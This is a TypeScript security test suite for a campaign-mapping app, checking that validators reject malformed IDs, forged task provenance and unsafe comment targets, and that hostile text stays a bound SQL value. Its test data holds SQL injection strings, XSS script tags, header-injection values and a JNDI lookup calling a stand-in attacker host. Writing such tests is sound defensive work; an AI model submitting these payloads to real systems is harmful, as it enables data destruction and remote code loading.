import assert from "node:assert/strict";
import test from "node:test";
import type { CampaignSnapshot } from "../src/domain/campaign.ts";
import type { CampaignMutation } from "../src/domain/mutations.ts";
import { validateCommentDraft } from "../src/domain/commentDraft.ts";
import { createLiveGroupTour } from "../src/domain/liveGroupTour.ts";
import { buildSupportDiagnostics } from "../src/support/supportDiagnostics.ts";
import type {
  D1DatabaseLike,
  D1PreparedStatement,
  D1RunResult,
} from "../worker/campaignRepository.ts";
import { persistCampaignMutation } from "../worker/mutationRepository.ts";
import { validateCampaignMutation } from "../worker/mutationValidation.ts";

const campaignId = "campaign_security";
const timestamp = "2026-08-26T12:00:00.000Z";

function validRenameMutation(id: unknown = "mutation_security") {
  return {
    id,
    campaignId,
    type: "campaign.rename",
    payload: { name: "Neue Aktion", expectedName: "Alte Aktion" },
    baseRevision: 2,
    createdAt: timestamp,
  };
}

const invalidMutationIds: unknown[] = [
  "",
  "mutation_",
  "notmutation_valid",
  "mutation space",
  "mutation/slash",
  "mutation\\backslash",
  "mutation?<script>",
  "mutation#fragment",
  "mutation%2Fetc",
  "mutation\nheader",
  "mutation\rheader",
  "mutation\tvalue",
  "mutation_ä",
  "mutation_😀",
  "mutation_'quote",
  'mutation_"quote',
  "mutation_;drop",
  "mutation_|pipe",
  "mutation_<tag>",
  "mutation_{json}",
  "mutation_[arr]",
  "mutation_@mail",
  "mutation_+plus",
  "mutation_=equals",
  `mutation_${"a".repeat(192)}`,
];

for (const [index, invalidId] of invalidMutationIds.entries()) {
  test(`security mutation id ${index + 1}: rejects malformed identifier`, () => {
    const result = validateCampaignMutation(validRenameMutation(invalidId), campaignId);
    assert.equal(result.valid, false);
  });
}

function validTaskCreateMutation() {
  return {
    id: "mutation_task-security",
    campaignId,
    type: "task.create",
    payload: {
      taskId: "task_security",
      areaId: "area_security",
      label: "Sicherheitsstraße",
      geometry: {
        type: "LineString",
        coordinates: [[8.6, 49.4], [8.61, 49.41]],
      },
      source: {
        dataset: "OpenStreetMap",
        objectType: "way",
        objectIds: [101, 102],
      },
    },
    baseRevision: 2,
    createdAt: timestamp,
  };
}

const invalidTaskSourceCases: Array<{
  name: string;
  mutate: (mutation: ReturnType<typeof validTaskCreateMutation>) => void;
}> = [
  { name: "wrong dataset", mutate: (m) => { m.payload.source = { dataset: "Other", objectType: "way", objectIds: [1] }; } },
  { name: "wrong object type", mutate: (m) => { m.payload.source = { dataset: "OpenStreetMap", objectType: "relation", objectIds: [1] }; } },
  { name: "empty object ids", mutate: (m) => { m.payload.source = { dataset: "OpenStreetMap", objectType: "way", objectIds: [] }; } },
  { name: "zero object id", mutate: (m) => { m.payload.source = { dataset: "OpenStreetMap", objectType: "way", objectIds: [0] }; } },
  { name: "negative object id", mutate: (m) => { m.payload.source = { dataset: "OpenStreetMap", objectType: "way", objectIds: [-1] }; } },
  { name: "fractional object id", mutate: (m) => { m.payload.source = { dataset: "OpenStreetMap", objectType: "way", objectIds: [1.5] }; } },
  { name: "NaN object id", mutate: (m) => { m.payload.source = { dataset: "OpenStreetMap", objectType: "way", objectIds: [Number.NaN] }; } },
  { name: "infinite object id", mutate: (m) => { m.payload.source = { dataset: "OpenStreetMap", objectType: "way", objectIds: [Number.POSITIVE_INFINITY] }; } },
  { name: "unsafe object id", mutate: (m) => { m.payload.source = { dataset: "OpenStreetMap", objectType: "way", objectIds: [Number.MAX_SAFE_INTEGER + 1] }; } },
  { name: "string object id", mutate: (m) => { (m.payload.source as Record<string, unknown>).objectIds = ["101"]; } },
  { name: "duplicate object ids", mutate: (m) => { m.payload.source = { dataset: "OpenStreetMap", objectType: "way", objectIds: [7, 7] }; } },
  { name: "null object ids", mutate: (m) => { (m.payload.source as Record<string, unknown>).objectIds = null; } },
  { name: "object instead of ids", mutate: (m) => { (m.payload.source as Record<string, unknown>).objectIds = { id: 1 }; } },
  { name: "array source", mutate: (m) => { m.payload.source = [] as unknown as typeof m.payload.source; } },
  { name: "string source", mutate: (m) => { m.payload.source = "OpenStreetMap" as unknown as typeof m.payload.source; } },
  { name: "extra source field", mutate: (m) => { m.payload.source = { dataset: "OpenStreetMap", objectType: "way", objectIds: [1], secret: "nope" } as unknown as typeof m.payload.source; } },
  { name: "missing dataset", mutate: (m) => { m.payload.source = { objectType: "way", objectIds: [1] } as unknown as typeof m.payload.source; } },
  { name: "missing object type", mutate: (m) => { m.payload.source = { dataset: "OpenStreetMap", objectIds: [1] } as unknown as typeof m.payload.source; } },
  { name: "missing object ids", mutate: (m) => { m.payload.source = { dataset: "OpenStreetMap", objectType: "way" } as unknown as typeof m.payload.source; } },
  { name: "OSM id forged as task id", mutate: (m) => { m.payload.taskId = "way_101"; } },
];

for (const [index, sourceCase] of invalidTaskSourceCases.entries()) {
  test(`security provenance ${index + 1}: rejects ${sourceCase.name}`, () => {
    const mutation = validTaskCreateMutation();
    sourceCase.mutate(mutation);
    const result = validateCampaignMutation(mutation, campaignId);
    assert.equal(result.valid, false);
  });
}

class CapturingStatement implements D1PreparedStatement {
  readonly query: string;
  values: unknown[] = [];
  private database: CapturingDatabase;

  constructor(query: string, database: CapturingDatabase) {
    this.query = query;
    this.database = database;
  }

  bind(...values: unknown[]) {
    this.values = values;
    return this;
  }

  async first<T>() {
    if (this.query.includes("FROM campaign_mutations")) return null;
    if (this.query.includes("SELECT revision FROM campaigns")) {
      return { revision: this.database.currentRevision } as T;
    }
    return null;
  }

  async all<T>() {
    return { results: [] as T[] };
  }
}

class CapturingDatabase implements D1DatabaseLike {
  currentRevision = 2;
  lastBatch: CapturingStatement[] = [];

  prepare(query: string) {
    return new CapturingStatement(query, this);
  }

  async batch(statements: D1PreparedStatement[]) {
    this.lastBatch = statements as CapturingStatement[];
    this.currentRevision += 1;
    return this.lastBatch.map<D1RunResult>(() => ({ success: true, meta: { changes: 1 } }));
  }
}

const hostileSqlStrings = [
  "x'); DROP TABLE campaigns; --",
  "'; DELETE FROM tasks; --",
  '" OR 1=1 --',
  "Robert'); DROP TABLE Students;--",
  "admin'/*",
  "'; UPDATE campaigns SET name='pwned'; --",
  "1; PRAGMA writable_schema=ON;",
  "' UNION SELECT * FROM access_sessions --",
  "${jndi:ldap://attacker.invalid/a}",
  "<script>alert('sql+xss')</script>",
];

for (const [index, hostileName] of hostileSqlStrings.entries()) {
  test(`security SQL binding ${index + 1}: hostile text remains a bound value`, async () => {
    const db = new CapturingDatabase();
    const mutation: CampaignMutation = {
      id: `mutation_sql-${index + 1}`,
      campaignId,
      type: "campaign.rename",
      payload: { name: hostileName, expectedName: "Alt" },
      baseRevision: 2,
      createdAt: timestamp,
    };

    const result = await persistCampaignMutation(db, mutation, 2);
    assert.deepEqual(result, { ok: true, revision: 3, alreadyApplied: false });
    const mutationWrite = db.lastBatch[1];
    assert.equal(mutationWrite.query.includes(hostileName), false);
    assert.equal(mutationWrite.values[0], hostileName);
  });
}

function diagnostics(campaignIdValue?: string | null) {
  return buildSupportDiagnostics({
    appVersion: "0.2.0",
    language: "de",
    online: true,
    campaignId: campaignIdValue,
    mapRenderer: "maplibre",
    mapRendererVersion: "5.7.1",
    snapshotSchemaVersion: 3,
    revision: 2,
    offlineMapPrepared: true,
  });
}

const hostileDiagnosticCampaignIds = [
  "campaign/other",
  "campaign other",
  "<script>alert(1)</script>",
  "https://example.invalid/token",
  "campaign\nCookie: secret",
  "campaign'; DROP TABLE x; --",
  "campaign;secret",
  "campaign_😀",
  "x".repeat(161),
];

for (const [index, hostileId] of hostileDiagnosticCampaignIds.entries()) {
  test(`security diagnostics ${index + 1}: rejects unsafe campaign identifier`, () => {
    assert.equal(diagnostics(hostileId).campaignId, null);
  });
}

test("security diagnostics 10: preserves allowlisted campaign identifier", () => {
  assert.equal(diagnostics("campaign_valid-1").campaignId, "campaign_valid-1");
});

test("security diagnostics 11: preserves dot colon underscore identifier characters", () => {
  assert.equal(diagnostics("campaign.a:b_c").campaignId, "campaign.a:b_c");
});

test("security diagnostics 12: truncates app version metadata", () => {
  const result = buildSupportDiagnostics({
    appVersion: "v".repeat(100), language: "de", online: true, mapRenderer: "maplibre",
    mapRendererVersion: "5.7.1", snapshotSchemaVersion: 3,
  });
  assert.equal(result.appVersion.length, 80);
});

test("security diagnostics 13: truncates renderer version metadata", () => {
  const result = buildSupportDiagnostics({
    appVersion: "0.2.0", language: "de", online: true, mapRenderer: "maplibre",
    mapRendererVersion: "r".repeat(60), snapshotSchemaVersion: 3,
  });
  assert.equal(result.mapRendererVersion.length, 40);
});

test("security diagnostics 14: rejects negative revision metadata", () => {
  const result = buildSupportDiagnostics({
    appVersion: "0.2.0", language: "de", online: true, mapRenderer: "maplibre",
    mapRendererVersion: "5.7.1", snapshotSchemaVersion: 3, revision: -1,
  });
  assert.equal(result.revision, null);
});

test("security diagnostics 15: normalizes non-finite snapshot schema metadata", () => {
  const result = buildSupportDiagnostics({
    appVersion: "0.2.0", language: "de", online: false, mapRenderer: "maplibre",
    mapRendererVersion: "5.7.1", snapshotSchemaVersion: Number.NaN,
  });
  assert.equal(result.snapshotSchemaVersion, 0);
  assert.equal(result.connectivity, "offline");
});

const invalidLiveGroupIds = [
  "",
  "group/other",
  "group other",
  "<script>alert(1)</script>",
  "group\nheader",
  "group_😀",
  "g".repeat(181),
  "group?token=secret",
  "group'quote",
  "group%2Fencoded",
];

for (const [index, groupId] of invalidLiveGroupIds.entries()) {
  test(`security live group ${index + 1}: rejects unsafe group id`, () => {
    assert.throws(() => createLiveGroupTour({ groupId, mode: "distribution", createdAt: timestamp }));
  });
}

const invalidParticipants = [0, -1, 501, 1.5, Number.NaN];
for (const [index, participantCount] of invalidParticipants.entries()) {
  test(`security live group ${index + 11}: rejects invalid participant count`, () => {
    assert.throws(() => createLiveGroupTour({
      groupId: `group_security-${index + 1}`,
      mode: "distribution",
      createdAt: timestamp,
      participantCount,
    }));
  });
}

function commentSnapshot(): CampaignSnapshot {
  return {
    schemaVersion: 3,
    revision: 1,
    campaign: {
      id: campaignId,
      name: "Security",
      status: "active",
      defaultMapView: null,
      createdAt: timestamp,
      updatedAt: timestamp,
    },
    teams: [],
    areas: [],
    tasks: [],
  };
}

const invalidCommentTargetIds = [
  "task space",
  "task/slash",
  "<script>alert(1)</script>",
  "task_😀",
  "t".repeat(181),
];

for (const [index, targetId] of invalidCommentTargetIds.entries()) {
  test(`security comment ${index + 1}: rejects unsafe target identifier`, () => {
    const result = validateCommentDraft(commentSnapshot(), {
      campaignId,
      target: { type: "task", id: targetId },
      body: "Hinweis",
    });
    assert.deepEqual(result, { valid: false, reason: "invalid-target" });
  });
}

for (const [index, foreignCampaignId] of ["campaign_other", "campaign_other-2", "campaign.other:3"].entries()) {
  test(`security comment ${index + 6}: rejects cross-campaign draft`, () => {
    const result = validateCommentDraft(commentSnapshot(), {
      campaignId: foreignCampaignId,
      target: { type: "campaign", id: campaignId },
      body: "Hinweis",
    });
    assert.deepEqual(result, { valid: false, reason: "invalid-campaign" });
  });
}

const missingTargets = [
  { type: "area", id: "area_missing" },
  { type: "task", id: "task_missing" },
  { type: "campaign", id: "campaign_missing" },
] as const;
for (const [index, target] of missingTargets.entries()) {
  test(`security comment ${index + 9}: rejects missing target`, () => {
    const result = validateCommentDraft(commentSnapshot(), { campaignId, target, body: "Hinweis" });
    assert.deepEqual(result, { valid: false, reason: "target-not-found" });
  });
}

test("security comment 12: rejects empty body", () => {
  const result = validateCommentDraft(commentSnapshot(), {
    campaignId, target: { type: "campaign", id: campaignId }, body: "   ",
  });
  assert.deepEqual(result, { valid: false, reason: "invalid-body" });
});

test("security comment 13: rejects oversized body", () => {
  const result = validateCommentDraft(commentSnapshot(), {
    campaignId, target: { type: "campaign", id: campaignId }, body: "x".repeat(2001),
  });
  assert.deepEqual(result, { valid: false, reason: "invalid-body" });
});

test("security comment 14: rejects non-string body", () => {
  const result = validateCommentDraft(commentSnapshot(), {
    campaignId, target: { type: "campaign", id: campaignId }, body: { html: "<b>bad</b>" },
  });
  assert.deepEqual(result, { valid: false, reason: "invalid-body" });
});

test("security comment 15: code and SQL-like body stays inert text", () => {
  const hostileBody = "<script>alert(1)</script> ' OR 1=1 --";
  const result = validateCommentDraft(commentSnapshot(), {
    campaignId, target: { type: "campaign", id: campaignId }, body: `  ${hostileBody}  `,
  });
  assert.equal(result.valid, true);
  if (result.valid) assert.equal(result.value.body, hostileBody);
});
